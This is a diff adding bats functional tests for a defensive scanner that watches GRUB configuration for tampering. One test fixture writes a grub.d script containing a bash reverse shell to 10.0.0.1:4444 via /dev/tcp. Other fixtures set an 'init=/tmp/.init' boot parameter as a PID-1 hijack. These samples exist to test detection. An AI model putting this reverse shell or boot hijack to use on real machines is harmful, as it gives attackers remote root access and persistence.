@@ -1,0 +1,135 @@
+#!/usr/bin/env bats
+# L2 bats functional tests for the grub-config-watchdog scan script.
+#
+# The /etc/grub.d/* generator scripts run AS ROOT at update-grub, and
+# /etc/default/grub holds GRUB_CMDLINE_LINUX — an `init=` there overrides
+# PID 1, a boot-time exec hijack (T1542/T1037). A grub.d script that is
+# world-writable / non-root-owned or carries an injection pattern, or a
+# GRUB_CMDLINE_LINUX with `init=`, is alert.
+#
+# Run with: bats packaging/test/L2-grub-config-watchdog.bats
+
+WD="${BATS_TEST_DIRNAME}/../../modules/grub-config-watchdog/systemd/grub-config-watchdog.sh"
+LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"
+
+setup() {
+    TMP="$(mktemp -d)"
+    BIN="${TMP}/bin"; mkdir -p "${BIN}"
+    cat > "${BIN}/logger" <<'FAKELOGGER'
+#!/usr/bin/env bash
+printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
+FAKELOGGER
+    chmod +x "${BIN}/logger"
+    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    BASELINE="${TMP}/baseline.tsv"
+    GRUBD="${TMP}/grub.d"; mkdir -p "${GRUBD}"
+    DEFAULT="${TMP}/default-grub"
+    SCRIPT="${GRUBD}/40_custom"
+}
+
+teardown() { rm -rf "${TMP}"; }
+
+run_wd() {
+    PATH="${BIN}:${PATH}" \
+    SELFDEF_MODULE_LIB="${LIB}" \
+    SELFDEF_GRUB_PROFILE="${PROFILE:-report}" \
+    SELFDEF_GRUB_BASELINE="${BASELINE}" \
+    SELFDEF_GRUB_D="${GRUBD_V:-$GRUBD}" \
+    SELFDEF_GRUB_DEFAULT="${DEFAULT_V:-$DEFAULT}" \
+    SELFDEF_GRUB_DEFAULT_D="${TMP}/no-default-d" \
+    bash "${WD}"
+}
+
+cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
+
+seed_benign() {
+    printf '#!/bin/sh\nset -e\nexec tail -n +3 "$0"\n' > "${SCRIPT}"
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
+}
+
+@test "no grub config → ok / no_grub_config" {
+    GRUBD_V="${TMP}/no-grubd" DEFAULT_V="${TMP}/nonexistent" run_wd
+    cap | grep -q '"event":"no_grub_config"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "benign grub config, first run → ok / baseline_initial" {
+    seed_benign
+    run_wd
+    cap | grep -q '"event":"baseline_initial"'
+    cap | grep -q '"severity":"ok"'
+    [ -f "${BASELINE}" ]
+}
+
+@test "unchanged grub config on second run → ok / grub_config_intact" {
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"grub_config_intact"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "an injection pattern in a grub.d script → alert / grub_config_suspicious" {
+    seed_benign
+    run_wd
+    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"event":"grub_config_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "a world-writable grub.d script → alert" {
+    seed_benign
+    run_wd
+    chmod 0666 "${SCRIPT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "an init= param in GRUB_CMDLINE_LINUX → alert (PID-1 hijack)" {
+    seed_benign
+    run_wd
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet splash init=/tmp/.init"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "a benign grub default change → warn / grub_config_changed" {
+    seed_benign
+    run_wd
+    printf 'GRUB_TIMEOUT=10\nGRUB_CMDLINE_LINUX="quiet splash"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -qE '"event":"grub_config_changed"'
+    cap | grep -q '"severity":"warn"'
+}
+
+@test "a benign grub.d script + clean cmdline is NOT flagged" {
+    seed_benign
+    run_wd
+    ! cap | grep -q '"severity":"alert"'
+    cap | grep -q '"severity":"ok"'
+}
+
+@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
+    seed_benign
+    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"event":"module_lib_missing"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "enforce profile exits non-zero on an init= cmdline" {
+    seed_benign
+    run_wd
+    printf 'GRUB_TIMEOUT=5\nGRUB_CMDLINE_LINUX="quiet init=/tmp/.init"\n' > "${DEFAULT}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    PROFILE=enforce run run_wd
+    [ "${status}" -ne 0 ]
+    cap | grep -q '"severity":"alert"'
+}
